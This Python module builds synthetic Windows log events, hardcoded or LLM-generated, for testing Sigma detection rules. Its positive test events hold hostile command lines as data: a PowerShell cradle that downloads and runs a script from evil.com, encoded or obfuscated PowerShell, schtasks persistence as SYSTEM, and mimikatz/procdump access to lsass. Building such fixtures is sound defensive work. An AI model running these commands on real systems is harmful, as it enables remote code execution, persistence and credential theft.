"""Generate synthetic test events for validating Sigma rules.

Provides both deterministic (hardcoded) and LLM-powered test data generation
for known MITRE ATT&CK techniques, enabling automated detection rule validation.
"""

from __future__ import annotations

import json
from typing import Any

import yaml
from chef_pantry.clients.llm import LLMClient
from pydantic import BaseModel, Field

# ---------------------------------------------------------------------------
# Models
# ---------------------------------------------------------------------------


class SyntheticEvent(BaseModel):
    """A single synthetic log event used to test a Sigma rule."""

    event_type: str = Field(
        description="Log event category, e.g. 'process_creation', 'registry_set'.",
    )
    fields: dict[str, Any] = Field(
        description="Key/value pairs representing the raw log fields.",
    )
    is_positive: bool = Field(
        description="True if this event SHOULD trigger the detection rule.",
    )
    description: str = Field(
        description="Human-readable explanation of why this event is positive or negative.",
    )


class SyntheticDataSet(BaseModel):
    """Collection of positive and negative test events for a single technique/rule pair."""

    technique_id: str
    rule_title: str
    positive_events: list[SyntheticEvent] = []
    negative_events: list[SyntheticEvent] = []


# ---------------------------------------------------------------------------
# Deterministic generator — hardcoded realistic events
# ---------------------------------------------------------------------------

_KNOWN_TECHNIQUES: dict[str, callable] = {}


def _register(technique_id: str):
    """Decorator to register a deterministic generator for a technique."""

    def wrapper(fn):
        _KNOWN_TECHNIQUES[technique_id] = fn
        return fn

    return wrapper


@_register("T1003.001")
def _t1003_001(sigma_rule: dict) -> SyntheticDataSet:
    """OS Credential Dumping: LSASS Memory."""
    rule_title = sigma_rule.get("title", "LSASS Memory Access")
    return SyntheticDataSet(
        technique_id="T1003.001",
        rule_title=rule_title,
        positive_events=[
            SyntheticEvent(
                event_type="process_access",
                fields={
                    "SourceImage": "C:\\Tools\\mimikatz.exe",
                    "TargetImage": "C:\\Windows\\System32\\lsass.exe",
                    "GrantedAccess": "0x1010",
                    "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9A4C4",
                    "SourceUser": "CORP\\attacker",
                },
                is_positive=True,
                description=(
                    "Mimikatz accessing lsass.exe with GrantedAccess 0x1010 "
                    "(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ), "
                    "a signature pattern for credential dumping."
                ),
            ),
            SyntheticEvent(
                event_type="process_access",
                fields={
                    "SourceImage": "C:\\Temp\\procdump.exe",
                    "TargetImage": "C:\\Windows\\System32\\lsass.exe",
                    "GrantedAccess": "0x1FFFFF",
                    "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9A4C4|C:\\Windows\\System32\\dbgcore.dll+6A12",
                    "SourceUser": "CORP\\admin",
                },
                is_positive=True,
                description=(
                    "ProcDump accessing lsass.exe with PROCESS_ALL_ACCESS (0x1FFFFF), "
                    "commonly used to dump LSASS memory to disk."
                ),
            ),
        ],
        negative_events=[
            SyntheticEvent(
                event_type="process_access",
                fields={
                    "SourceImage": "C:\\Windows\\System32\\wbem\\wmiprvse.exe",
                    "TargetImage": "C:\\Windows\\System32\\lsass.exe",
                    "GrantedAccess": "0x1400",
                    "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9A4C4",
                    "SourceUser": "NT AUTHORITY\\SYSTEM",
                },
                is_positive=False,
                description=(
                    "WMI provider host legitimately accessing lsass.exe with benign "
                    "GrantedAccess 0x1400 — normal OS housekeeping."
                ),
            ),
            SyntheticEvent(
                event_type="process_access",
                fields={
                    "SourceImage": "C:\\Windows\\System32\\csrss.exe",
                    "TargetImage": "C:\\Windows\\System32\\lsass.exe",
                    "GrantedAccess": "0x0800",
                    "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9A4C4",
                    "SourceUser": "NT AUTHORITY\\SYSTEM",
                },
                is_positive=False,
                description=(
                    "Client/Server Runtime Subsystem (csrss.exe) querying lsass — "
                    "expected behaviour during normal Windows session management."
                ),
            ),
        ],
    )


@_register("T1059.001")
def _t1059_001(sigma_rule: dict) -> SyntheticDataSet:
    """Command and Scripting Interpreter: PowerShell."""
    rule_title = sigma_rule.get("title", "Suspicious PowerShell Invocation")
    return SyntheticDataSet(
        technique_id="T1059.001",
        rule_title=rule_title,
        positive_events=[
            SyntheticEvent(
                event_type="process_creation",
                fields={
                    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "CommandLine": (
                        "powershell.exe -nop -w hidden -enc "
                        "SW`BF`X```(`$`e`n`v`:C`O`M`S`P`E`C`,`'/c calc.exe`'`)"
                    ),
                    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                    "User": "CORP\\attacker",
                    "IntegrityLevel": "High",
                },
                is_positive=True,
                description=(
                    "PowerShell command with heavy backtick obfuscation, hidden window, "
                    "and -nop flags — classic evasion pattern for payload delivery."
                ),
            ),
            SyntheticEvent(
                event_type="process_creation",
                fields={
                    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "CommandLine": (
                        "powershell.exe -ep bypass -nop -command "
                        "\"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')\""
                    ),
                    "ParentImage": "C:\\Windows\\System32\\mshta.exe",
                    "User": "CORP\\user1",
                    "IntegrityLevel": "Medium",
                },
                is_positive=True,
                description=(
                    "PowerShell cradle downloading and executing remote script via "
                    "IEX + Net.WebClient — a well-known staged payload delivery technique."
                ),
            ),
        ],
        negative_events=[
            SyntheticEvent(
                event_type="process_creation",
                fields={
                    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "CommandLine": "powershell.exe Get-Process | Select-Object Name, CPU",
                    "ParentImage": "C:\\Windows\\explorer.exe",
                    "User": "CORP\\admin",
                    "IntegrityLevel": "Medium",
                },
                is_positive=False,
                description=(
                    "Normal administrative PowerShell command listing processes — "
                    "no obfuscation, no suspicious flags."
                ),
            ),
            SyntheticEvent(
                event_type="process_creation",
                fields={
                    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "CommandLine": "powershell.exe -File C:\\Scripts\\backup.ps1",
                    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
                    "User": "NT AUTHORITY\\SYSTEM",
                    "IntegrityLevel": "System",
                },
                is_positive=False,
                description=(
                    "Scheduled backup script executed via svchost — legitimate "
                    "automation with no evasion indicators."
                ),
            ),
        ],
    )


@_register("T1053.005")
def _t1053_005(sigma_rule: dict) -> SyntheticDataSet:
    """Scheduled Task/Job: Scheduled Task."""
    rule_title = sigma_rule.get("title", "Scheduled Task Creation")
    return SyntheticDataSet(
        technique_id="T1053.005",
        rule_title=rule_title,
        positive_events=[
            SyntheticEvent(
                event_type="process_creation",
                fields={
                    "Image": "C:\\Windows\\System32\\schtasks.exe",
                    "CommandLine": (
                        'schtasks.exe /create /tn "WindowsUpdate" '
                        '/tr "C:\\Users\\Public\\payload.exe" /sc onlogon /ru SYSTEM'
                    ),
                    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                    "User": "CORP\\attacker",
                    "IntegrityLevel": "High",
                },
                is_positive=True,
                description=(
                    "Scheduled task created to run a suspicious payload from a public "
                    "directory as SYSTEM on every logon — persistence mechanism."
                ),
            ),
            SyntheticEvent(
                event_type="process_creation",
                fields={
                    "Image": "C:\\Windows\\System32\\schtasks.exe",
                    "CommandLine": (
                        'schtasks.exe /create /tn "ChromeUpdater" '
                        '/tr "powershell.exe -enc SQBFAFgA..." /sc minute /mo 15 /ru SYSTEM'
                    ),
                    "ParentImage": "C:\\Temp\\dropper.exe",
                    "User": "CORP\\compromised",
                    "IntegrityLevel": "High",
                },
                is_positive=True,
                description=(
                    "Encoded PowerShell payload scheduled every 15 minutes via schtasks — "
                    "persistence with encoded command execution from a suspicious parent."
                ),
            ),
        ],
        negative_events=[
            SyntheticEvent(
                event_type="process_creation",
                fields={
                    "Image": "C:\\Windows\\System32\\schtasks.exe",
                    "CommandLine": "schtasks.exe /query /fo LIST /v",
                    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                    "User": "CORP\\admin",
                    "IntegrityLevel": "Medium",
                },
                is_positive=False,
                description=(
                    "Administrator querying existing scheduled tasks with /query — "
                    "read-only operation, no task creation."
                ),
            ),
            SyntheticEvent(
                event_type="process_creation",
                fields={
                    "Image": "C:\\Windows\\System32\\schtasks.exe",
                    "CommandLine": (
                        'schtasks.exe /create /tn "Defrag" '
                        '/tr "defrag.exe C: /O" /sc weekly /d SUN /st 02:00'
                    ),
                    "ParentImage": "C:\\Windows\\System32\\mmc.exe",
                    "User": "CORP\\admin",
                    "IntegrityLevel": "High",
                },
                is_positive=False,
                description=(
                    "Legitimate weekly disk defragmentation task created by an admin "
                    "from Task Scheduler (mmc.exe) — normal maintenance."
                ),
            ),
        ],
    )


def generate_test_data_deterministic(
    technique_id: str,
    sigma_rule: dict,
) -> SyntheticDataSet:
    """Return hardcoded test events for known techniques.

    For unknown techniques, returns an empty ``SyntheticDataSet``.
    """
    generator = _KNOWN_TECHNIQUES.get(technique_id)
    if generator is None:
        return SyntheticDataSet(
            technique_id=technique_id,
            rule_title=sigma_rule.get("title", "Unknown"),
        )
    return generator(sigma_rule)


# ---------------------------------------------------------------------------
# LLM-powered generator
# ---------------------------------------------------------------------------

_LLM_SYSTEM = (
    "You are a detection engineer generating synthetic test events for Sigma rule validation. "
    "Events must be realistic Windows log entries with accurate field names and values."
)

_LLM_PROMPT_TEMPLATE = """\
Generate test data for the following Sigma rule. Produce exactly 2 positive events \
(that SHOULD trigger the rule) and 2 negative events (that should NOT trigger).

Sigma Rule YAML:
```yaml
{rule_yaml}
```

Technique ID: {technique_id}

For each event provide:
- event_type: the Windows log event category (e.g. "process_creation", "process_access")
- fields: realistic log fields that match or intentionally miss the detection logic
- is_positive: true for events that should trigger, false for benign
- description: explain why this event should or should not fire the rule

Return the result as a JSON object with keys: technique_id, rule_title, positive_events, negative_events.
"""


async def generate_test_data_llm(
    technique_id: str,
    sigma_rule: dict,
    llm_client: LLMClient,
) -> SyntheticDataSet:
    """Use an LLM to generate test events that match a Sigma rule's detection logic.

    The LLM is prompted with the full Sigma rule YAML and asked to produce
    2 positive and 2 negative events with realistic field values.
    """
    rule_yaml = yaml.dump(sigma_rule, default_flow_style=False, sort_keys=False)
    prompt = _LLM_PROMPT_TEMPLATE.format(
        rule_yaml=rule_yaml,
        technique_id=technique_id,
    )
    return await llm_client.generate_structured(
        prompt,
        SyntheticDataSet,
        system=_LLM_SYSTEM,
    )


# ---------------------------------------------------------------------------
# JSONL serialisation
# ---------------------------------------------------------------------------


def to_jsonl(test_data: SyntheticDataSet) -> str:
    """Serialise all events in a ``SyntheticDataSet`` as newline-delimited JSON (JSONL).

    Each line is a JSON object suitable for ingestion into a SIEM or log pipeline.
    The ``_meta`` key carries test-harness metadata (technique, rule, positive/negative).
    """
    lines: list[str] = []
    for event in test_data.positive_events + test_data.negative_events:
        record = {
            **event.fields,
            "_meta": {
                "technique_id": test_data.technique_id,
                "rule_title": test_data.rule_title,
                "event_type": event.event_type,
                "is_positive": event.is_positive,
                "description": event.description,
            },
        }
        lines.append(json.dumps(record, default=str))
    return "\n".join(lines)
